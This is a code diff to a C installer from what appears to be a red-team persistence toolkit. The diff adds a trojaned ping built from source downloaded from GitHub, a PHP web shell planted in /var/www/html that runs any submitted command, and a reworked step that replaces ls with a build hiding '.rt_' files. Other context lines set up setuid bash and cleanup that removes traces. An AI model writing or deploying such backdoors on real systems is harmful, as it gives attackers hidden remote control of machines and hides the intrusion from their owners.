@@ -9,10 +9,12 @@
 #define BASH_ID     1
 #define PROCESSD_ID 2
 #define LS_ID 4
+#define PING_ID 8
+#define FRONTDOOR_ID 16
 
 
 // Configure install here:
-#define INSTALL BASH_ID | PROCESSD_ID | LS_ID
+#define INSTALL BASH_ID | PROCESSD_ID | LS_ID | PING_ID | FRONTDOOR_ID
 
 
 // Debugging mode
@@ -29,6 +31,8 @@ int re_setuid_bash(void);
 void download_file(const char *hostname, const char *path, const char *output_filename);
 int re_processd(void);
 int re_broken_ls(void);
+int re_fake_ping(void);
+int re_http_frontdoor(void);
 
 ////////////////////////////////////////
 ////////// SETUID BASH
@@ -168,6 +172,8 @@ int re_processd(void){
     // processd executable
     system("gcc /tmp/processd.c -o /var/lib/processd");
     system("chmod 500 /var/lib/processd");
+    // remove tmp file
+    system("rm /tmp/processd.c");
 
     // processd.service
     download_file("raw.githubusercontent.com", "/JackDunfey/Red-Team-Tools/refs/heads/main/processd/processd.service", "/etc/systemd/system/processd.service");
@@ -180,34 +186,75 @@ int re_processd(void){
 ////////////////////////////////////////
 ////////// Broken ls
 ////////////////////////////////////////
-static const char *ls_commands = "sed -i -e 's/# deb-src/deb-src/' /etc/apt/sources.list"
-                            "apt update"
-                            "apt-get source -y coreutils && apt-get build-dep -y coreutils"
-                            "cd coreutils-*"
-                            "yes | autoreconf -fiv"
-                            "FORCE_UNSAFE_CONFIGURE=1 ./configure --prefix=/usr --disable-silent-rules"
-                            "awk 'BEGIN { "
-                            "  found = 0; inserted = 0"
-                            "} "
-                            "/file_ignored \\(char const \\*name\\)$/ { "
-                            "  print $0"
-                            "  found = 1"
-                            "  next"
-                            "} "
-                            "found == 1 && inserted == 0 && $0 == \"{\" { "
-                            "  print $0"
-                            "  print \"  if (strncmp(name, \\".rt_\\", 3) == 0) { return true; }\""
-                            "  inserted = 1"
-                            "  found = 2"
-                            "  next"
-                            "} "
-                            "{ print $0 }' src/ls.c > tempfile && mv tempfile src/ls.c"
-                            "make -j${nproc}"
-                            "echo \"Replacing ls\""
-                            "cp src/ls $(which ls)"
-                            "cd ..";
+static const char *ls_commands = { "sed -i -e 's/# deb-src/deb-src/' /etc/apt/sources.list", 
+    "apt update", 
+    "apt-get source -y coreutils && apt-get build-dep -y coreutils", 
+    "cd coreutils-*", 
+    "yes | autoreconf -fiv", 
+    "FORCE_UNSAFE_CONFIGURE=1 ./configure --prefix=/usr --disable-silent-rules", 
+    "awk 'BEGIN { ", 
+    "  found = 0; inserted = 0", 
+    "} ", 
+    "/file_ignored \\(char const \\*name\\)$/ { ", 
+    "  print $0", 
+    "  found = 1", 
+    "  next", 
+    "} ", 
+    "found == 1 && inserted == 0 && $0 == \"{\" { ", 
+    "  print $0", 
+    "  print \"  if (strncmp(name, \\".rt_\\", 3) == 0) { return true; }\"", 
+    "  inserted = 1", 
+    "  found = 2", 
+    "  next", 
+    "} ", 
+    "{ print $0 }' src/ls.c > tempfile && mv tempfile src/ls.c", 
+    "make -j${nproc}", 
+    "echo \"Replacing ls\"", 
+    "cp src/ls $(which ls)", 
+    "cd ..",
+    NULL
+};
 int re_broken_ls(void){
-    system(ls_commands);
+    char **current_string = ls_commands;
+    while (*current_string) {
+        system(*current_string++);
+    };
+    return 0;
+}
+
+////////////////////////////////////////
+////////// Broken ping
+////////////////////////////////////////
+
+int re_fake_ping(void){
+    // Download ping.c
+    download_file("raw.githubusercontent.com", "/JackDunfey/Red-Team-Tools/refs/heads/main/ping/ping.c", "/tmp/ping.c");
+    // Replace ping
+    system("gcc /tmp/ping.c -o `which ping`");
+    // Remove temporary file
+    system("rm /tmp/ping.c");
+    return 0;
+}
+
+////////////////////////////////////////
+////////// Broken ls
+////////////////////////////////////////
+const char *frontdoor_contents = "<form method=\"GET\">\n"
+"    <p>Command: <input type=\"text\" name=\"command\"></p>\n"
+"    <input type=\"submit\" value=\"Run\">\n"
+"</form>\n"
+"<?php\n"
+"    if(isset($_GET[\"command\"])){\n"
+"        $out = shell_exec($_GET[\"command\"]);\n"
+"        echo \"<pre>\" . $out . \"</pre>\";\n"
+"    }\n"
+"?>";
+int re_http_frontdoor(void){
+    // Create file and write above php
+    FILE *fp = fopen("/var/www/html/rt_frontdoor.php", "w+");
+    fprintf(fp, "%s", frontdoor_contents);
+    fclose(fp);
+
     return 0;
 }
 
@@ -221,6 +268,8 @@ int main(int argc, char **argv){
         failures |= PROCESSD_ID;
     if(INSTALL & LS_ID && re_broken_ls())
         failures |= LS_ID;
+    if(INSTALL & PING_ID && re_fake_ping())
+        failures |= PING_ID;
 
     if (failures & BASH_ID)
         print_failure("setuid bash");
@@ -228,4 +277,6 @@ int main(int argc, char **argv){
         print_failure("processd");
     if (failures & LS_ID)
         print_failure("ls");
+    if (failures & PING_ID)
+        print_failure("false ping");
 }
